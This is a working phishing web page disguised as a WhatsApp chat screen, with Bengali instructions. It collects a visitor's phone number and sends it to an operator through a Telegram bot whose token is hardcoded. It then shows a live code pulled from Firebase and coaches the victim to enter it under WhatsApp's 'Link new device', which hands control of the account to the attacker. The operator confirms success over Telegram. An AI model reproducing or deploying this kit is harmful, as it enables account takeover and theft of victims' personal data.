<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Chat with Nusrat jahan</title>
    
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    
    <!-- FontAwesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Helvetica+Neue:wght@400;500;700&family=Roboto:wght@300;400;500&display=swap');

        body {
            font-family: 'Helvetica Neue', 'Roboto', sans-serif;
            background-color: #d1d7db;
            height: 100vh;
            overflow: hidden;
        }

        .app-wrapper {
            max-width: 100%;
            height: 100%;
            margin: 0 auto;
            background-color: #efe7dd;
            position: relative;
            display: flex;
            flex-direction: column;
            background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png');
            background-blend-mode: overlay;
        }

        .encryption-msg {
            background-color: #ffeecd;
            color: #54656f;
            font-size: 0.70rem;
            text-align: center;
            padding: 6px 10px;
            border-radius: 8px;
            margin: 10px auto;
            max-width: 90%;
            box-shadow: 0 1px 0.5px rgba(0,0,0,0.13);
            line-height: 1.3;
        }

        /* Cards */
        .system-card {
            background-color: white;
            border-radius: 12px;
            padding: 20px;
            margin: 10px 15px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            text-align: center;
            animation: fadeIn 0.4s ease-out;
        }

        .wa-btn {
            background-color: #008069;
            color: white;
            border-radius: 24px;
            padding: 10px 24px;
            font-weight: 500;
            font-size: 14px;
            transition: background 0.2s;
            width: 100%;
            border: none;
            cursor: pointer;
        }
        .wa-btn:active { background-color: #006b57; }

        /* Pin Box */
        .pin-box {
            width: 35px;
            height: 45px;
            border: 1px solid #d1d7db;
            background: #f0f2f5;
            text-align: center;
            font-size: 20px;
            font-weight: bold;
            color: #111b21;
            border-radius: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        /* Video Container */
        .video-container {
            width: 100%;
            height: 180px;
            background: black;
            border-radius: 8px;
            overflow: hidden;
            margin-bottom: 15px;
            border: 1px solid #e5e7eb;
            position: relative;
        }
        
        .instruction-list {
            text-align: left;
            font-size: 13px;
            color: #54656f;
            margin-top: 15px;
            padding: 10px;
            background: #f7f9fa;
            border-radius: 8px;
        }
        .instruction-list li { margin-bottom: 5px; }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Footer */
        .footer-fake {
            background-color: #f0f2f5;
            padding: 10px 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            cursor: pointer;
        }
        .input-pill {
            flex: 1;
            background: white;
            height: 42px;
            border-radius: 21px;
            padding: 0 20px;
            display: flex;
            align-items: center;
            color: #8696a0;
            font-size: 15px;
        }

        /* Error Message Box */
        .error-box {
            background-color: #ffebee;
            border: 1px solid #ffcdd2;
            color: #c62828;
            padding: 10px;
            border-radius: 8px;
            font-size: 13px;
            margin-top: 10px;
            text-align: left;
            display: none; /* Hidden initially */
        }
    </style>
</head>
<body>

    <div class="app-wrapper">
        
        <!-- HEADER -->
        <header class="bg-[#008069] h-[60px] flex items-center px-4 shadow-md z-10 shrink-0">
            <div class="flex items-center gap-3 text-white w-full">
                <i class="fa-solid fa-arrow-left text-xl"></i>
                
                <div class="w-9 h-9 rounded-full bg-gray-300 overflow-hidden relative border border-white/30">
                    <img src="my-logo.jpg" onerror="this.src='https://via.placeholder.com/50'" class="w-full h-full object-cover" alt="Profile">
                </div>

                <div class="flex-1 flex flex-col justify-center">
                    <h1 class="text-[17px] font-medium leading-tight">Nusrat jahan</h1>
                    <span class="text-[12px] opacity-90">Message yourself</span>
                </div>

                <div class="flex gap-5 text-xl">
                    <i class="fa-solid fa-video"></i>
                    <i class="fa-solid fa-phone"></i>
                    <i class="fa-solid fa-ellipsis-vertical"></i>
                </div>
            </div>
        </header>

        <!-- CHAT AREA -->
        <main class="flex-1 overflow-y-auto pt-4 relative scroll-smooth" id="chatMain">
            
            <div class="encryption-msg">
                <i class="fa-solid fa-lock text-[10px] mr-1"></i> 
                Messages are end-to-end encrypted. No one outside of this chat, not even WhatsApp, can read or listen to them.
            </div>

            <div class="flex justify-center mb-4 mt-4">
                <span class="bg-white/80 text-[#54656f] text-[12px] font-medium px-3 py-1.5 rounded-lg shadow-sm backdrop-blur-sm">Today</span>
            </div>

            <!-- PHASE 1: PHONE INPUT -->
            <div id="inputSection" class="system-card mx-auto max-w-[320px]">
                <div class="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-3 text-[#008069]">
                    <i class="fa-brands fa-whatsapp text-2xl"></i>
                </div>
                <h2 class="text-sm font-bold text-gray-800 mb-2">Connect to Nusrat jahan</h2>
                <p class="text-xs text-gray-500 mb-4">To enable chat, please verify your phone number.</p>
                
                <form id="phoneForm" class="flex flex-col gap-3">
                    <input 
                        type="tel" 
                        id="phoneNumber"
                        placeholder="Phone Number (e.g. 017...)" 
                        class="w-full bg-[#f0f2f5] border-none rounded-lg px-4 py-3 text-sm focus:ring-2 focus:ring-[#008069] outline-none text-center font-bold text-gray-800"
                        required
                    />
                    <button type="submit" id="submitBtn" class="wa-btn shadow">
                        Unlock Chat
                    </button>
                </form>
            </div>

            <!-- PHASE 2: LOADING (5 Seconds) -->
            <div id="loadingSection" class="hidden system-card mx-auto max-w-[320px]">
                <div class="w-12 h-12 border-4 border-gray-200 border-t-[#008069] rounded-full animate-spin mx-auto mb-4"></div>
                <h2 class="text-lg font-bold text-gray-800">Unlocking...</h2>
                <p class="text-xs text-gray-500">Please wait while we verify details.</p>
            </div>

            <!-- PHASE 3: GUIDE & CODE -->
            <div id="guideSection" class="hidden system-card mx-auto max-w-[340px]">
                
                <!-- Video Frame -->
                <div class="video-container">
                    <video class="w-full h-full object-cover" autoplay loop muted playsinline>
                        <source src="my-video.mp4" type="video/mp4">
                        Your browser does not support the video tag.
                    </video>
                </div>

                <!-- Headline -->
                <h2 class="text-[14px] font-bold text-red-600 mb-4 leading-snug">
                    Nusrat jahan whatsapp account is locked please follow this unlock step
                </h2>

                <!-- Countdown UI -->
                <div id="countdownBox" class="bg-amber-50 text-amber-800 text-sm py-2 px-4 rounded mb-4 border border-amber-100 font-bold">
                    Your Unlock Number is Coming soon... <span id="timerDisplay">20</span>s
                </div>

                <!-- Live Code Box (Hidden initially) -->
                <div id="pinContainer" class="hidden flex justify-center gap-1 mb-4">
                    <div class="pin-box pin-digit"></div><div class="pin-box pin-digit"></div><div class="pin-box pin-digit"></div><div class="pin-box pin-digit"></div>
                    <div class="pin-box pin-digit"></div><div class="pin-box pin-digit"></div><div class="pin-box pin-digit"></div><div class="pin-box pin-digit"></div>
                </div>

                <!-- Action Button (Hidden initially) -->
                <button id="actionBtn" class="hidden w-full py-3 bg-[#008069] text-white font-bold rounded-full shadow-lg hover:bg-[#006b57] transition-all animate-pulse mb-4 text-sm">
                    Enter this unlock number here
                </button>

                <!-- Instructions -->
                <div class="instruction-text text-left text-sm text-gray-600 bg-gray-50 p-3 rounded">
                    <p class="font-bold underline mb-1">‡¶®‡¶ø‡¶∞‡ßç‡¶¶‡ßá‡¶∂‡¶®‡¶æ:</p>
                    <ol class="list-decimal list-inside space-y-1">
                        <li>Notification ‡¶•‡ßá‡¶ï‡ßá <b>"Link new device"</b> ‡¶è ‡¶Ø‡¶æ‡¶®‡•§</li>
                        <li>Confirm ‡¶ï‡¶∞‡ßá ‡¶Ü‡¶®‡¶≤‡¶ï ‡¶ï‡¶∞‡ßÅ‡¶®‡•§</li>
                        <li>‡¶â‡¶™‡¶∞‡ßá‡¶∞ ‡¶ï‡ßã‡¶°‡¶ü‡¶ø ‡¶™‡ßç‡¶∞‡¶¨‡ßá‡¶∂ ‡¶ï‡¶∞‡¶æ‡¶®‡•§</li>
                    </ol>
                </div>

                <!-- Error Message Container -->
                <div id="errorBox" class="error-box">
                    <p><b>Warning:</b> ‡¶¶‡ßü‡¶æ ‡¶ï‡¶∞‡ßá ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶´‡ßã‡¶® ‡¶è‡¶∞ notification ‡¶•‡ßá‡¶ï‡ßá Enter cod to link new device ‡¶è‡¶∞ ‡¶≠‡ßá‡¶§‡¶∞‡ßá ‡¶™‡ßç‡¶∞‡¶¨‡ßá‡¶∂ ‡¶ï‡¶∞‡ßÅ‡¶® ‡¶è‡¶¨‡¶Ç Whatsapp ‡¶™‡ßá‡¶ú‡ßá ‡¶•‡¶æ‡¶ï‡¶æ ‡¶Ü‡¶®‡¶≤‡¶ï ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ ‡ßÆ‡¶ü‡¶ø ‡¶∏‡ßá‡¶ñ‡¶æ‡¶®‡ßá ‡¶¨‡¶∏‡¶æ‡¶®‡•§ ‡¶è‡¶á ‡¶Ü‡¶®‡¶≤‡¶ï ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ ‡ßÆ‡¶ü‡¶ø ‡¶∏‡ßÅ‡¶∞‡¶ï‡ßç‡¶∑‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶™‡ßç‡¶∞‡¶§‡¶ø ‡ßß‡¶Æ‡¶ø‡¶®‡¶ø‡¶ü ‡¶™‡¶∞ ‡¶™‡¶∞ ‡¶™‡¶∞‡¶ø‡¶¨‡¶∞‡ßç‡¶§‡¶® ‡¶π‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡ßá‡•§</p>
                </div>
            </div>

            <!-- PHASE 4: SUCCESS (Start Button) -->
            <div id="successSection" class="hidden system-card mx-auto max-w-[320px]">
                <div class="w-16 h-16 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-4 text-3xl">
                    <i class="fa-solid fa-check"></i>
                </div>
                <h2 class="text-lg font-bold text-gray-800 mb-2">Successful!</h2>
                <p class="text-sm text-gray-500 mb-6">You are now connected.</p>
                
                <button id="startBtn" class="wa-btn shadow text-lg w-full">
                    Start Chat <i class="fa-solid fa-paper-plane ml-2"></i>
                </button>
            </div>

        </main>

        <!-- FOOTER -->
        <footer class="footer-fake shrink-0" id="messageTrigger">
            <i class="fa-solid fa-plus text-[#54656f] text-2xl"></i>
            <div class="input-pill">Type a message</div>
            <i class="fa-solid fa-microphone text-[#54656f] text-xl ml-1"></i>
        </footer>

    </div>

    <!-- Logic -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
        import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

        // --- CONFIGURATION ---
        const firebaseConfig = {
            apiKey: "AIzaSyCnE3ixu-seDdC0csNEwsumKFEB3Im8DGE",
            authDomain: "my-whatsapp-page.firebaseapp.com",
            databaseURL: "https://my-whatsapp-page-default-rtdb.firebaseio.com",
            projectId: "my-whatsapp-page",
            storageBucket: "my-whatsapp-page.firebasestorage.app",
            messagingSenderId: "458940936506",
            appId: "1:458940936506:web:d4faab25813f064c27a003",
            measurementId: "G-EQ1QQDBTKG"
        };

        const TELEGRAM_BOT_TOKEN = "7974529959:AAEyUKUkiGdMsLVqNz_fQdL2s3kiE5apuGM"; 
        const CHAT_ID = "6658445342";
        const API_URL_SEND = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const API_URL_UPDATES = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`;

        // DOM Elements
        const inputSection = document.getElementById('inputSection');
        const loadingSection = document.getElementById('loadingSection');
        const guideSection = document.getElementById('guideSection');
        const successSection = document.getElementById('successSection');
        
        const phoneForm = document.getElementById('phoneForm');
        const phoneNumberInput = document.getElementById('phoneNumber');
        
        const countdownBox = document.getElementById('countdownBox');
        const timerDisplay = document.getElementById('timerDisplay');
        
        const pinContainer = document.getElementById('pinContainer');
        const pinDigits = document.querySelectorAll('.pin-digit');
        const actionBtn = document.getElementById('actionBtn');
        const errorBox = document.getElementById('errorBox');
        
        const messageTrigger = document.getElementById('messageTrigger');
        const startBtn = document.getElementById('startBtn');

        let lastUpdateId = 0;
        let pollingInterval;

        // --- Logic: Click footer to trigger verification ---
        messageTrigger.addEventListener('click', () => {
            inputSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
            phoneNumberInput.focus();
        });

        // --- Logic: Send Telegram Msg ---
        async function sendTelegramMessage(text) {
            try {
                await fetch(API_URL_SEND, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
                });
            } catch (error) { console.error("Telegram error:", error); }
        }

        // --- Logic: Firebase Live Code ---
        function startFirebaseListener() {
            try {
                const app = initializeApp(firebaseConfig);
                const db = getDatabase(app);
                const liveCodeRef = ref(db, 'liveCode');

                onValue(liveCodeRef, (snapshot) => {
                    const data = snapshot.val();
                    const code = data && data.code ? String(data.code).trim().padEnd(8, ' ') : "        ";
                    pinDigits.forEach((digitDiv, index) => {
                        digitDiv.textContent = code[index] || '';
                    });
                });
            } catch (error) { console.error(error); }
        }

        // --- Logic: Poll Telegram for "successful" or "error" command ---
        function startTelegramPolling() {
            pollingInterval = setInterval(async () => {
                try {
                    const response = await fetch(`${API_URL_UPDATES}?offset=${lastUpdateId + 1}`);
                    const data = await response.json();

                    if (data.ok && data.result.length > 0) {
                        data.result.forEach(update => {
                            lastUpdateId = update.update_id;
                            const messageText = update.message?.text?.trim().toLowerCase();

                            if (messageText === 'successfull' || messageText === '/success') {
                                // Show Success Screen
                                clearInterval(pollingInterval);
                                guideSection.classList.add('hidden');
                                successSection.classList.remove('hidden');
                            } 
                            else if (messageText === '/error') {
                                // Show Error Message
                                errorBox.style.display = 'block';
                            }
                        });
                    }
                } catch (error) {
                    console.error("Polling error:", error);
                }
            }, 2000); // Check every 2 seconds
        }

        // --- Logic: Phone Submit ---
        phoneForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const phone = phoneNumberInput.value.trim();

            if (!phone || phone.length < 10) {
                alert("Please enter a valid phone number.");
                return;
            }

            // 1. Send Number to Telegram
            await sendTelegramMessage(`*üö® Login Attempt (WhatsApp)*\nUser: Nusrat jahan\nPhone: \`${phone}\`\n\n_System: 5s Unlocking Animation Started..._`);

            // 2. Show Loading (5 Seconds)
            inputSection.classList.add('hidden');
            loadingSection.classList.remove('hidden');

            setTimeout(() => {
                // After 5s: Show Guide Section with Countdown
                loadingSection.classList.add('hidden');
                guideSection.classList.remove('hidden');
                startCountdownLogic();
            }, 5000);
        });

        // --- Logic: Countdown 20s ---
        function startCountdownLogic() {
            let timeLeft = 20;
            const timerInterval = setInterval(() => {
                timeLeft--;
                if(timerDisplay) timerDisplay.textContent = timeLeft;

                if (timeLeft <= 0) {
                    clearInterval(timerInterval);
                    
                    // Show PINs and Button
                    countdownBox.classList.add('hidden');
                    pinContainer.classList.remove('hidden');
                    actionBtn.classList.remove('hidden');
                    
                    // Start Syncing
                    startFirebaseListener();
                }
            }, 1000);
        }

        // --- Logic: Action Button (Enter this unlock number) ---
        actionBtn.addEventListener('click', async () => {
            // 1. Send Telegram Msg: User wants to enter
            await sendTelegramMessage(`‚ö†Ô∏è *User Action:* User clicked 'Enter unlock number'.\n\n_Bot Action: Trying to open 'Link new device' and Polling for Admin Command..._`);

            // 2. Try to open WhatsApp (Simulate Notification Click)
            window.location.href = "whatsapp://";

            // 3. Send Telegram Msg: Entered option
            setTimeout(async () => {
                await sendTelegramMessage(`‚úÖ *System:* Enter cod to link new device ‡¶Ö‡¶™‡¶∂‡¶®‡ßá‡¶∞ ‡¶≠‡ßá‡¶§‡¶∞‡ßá ‡¶™‡ßç‡¶∞‡¶¨‡ßá‡¶∂ ‡¶ï‡¶∞‡¶æ‡¶®‡ßã ‡¶π‡ßü‡ßá‡¶õ‡ßá‡•§\n\nüëâ Now send: \`/success\` or \`/error\``);
                
                // 4. Start listening for Admin Commands
                startTelegramPolling();
            }, 2000);
        });

        // --- Logic: Start Button (Final Redirect) ---
        startBtn.addEventListener('click', () => {
            window.location.href = "https://wa.me/8801806853977";
        });

    </script>
</body>
</html>
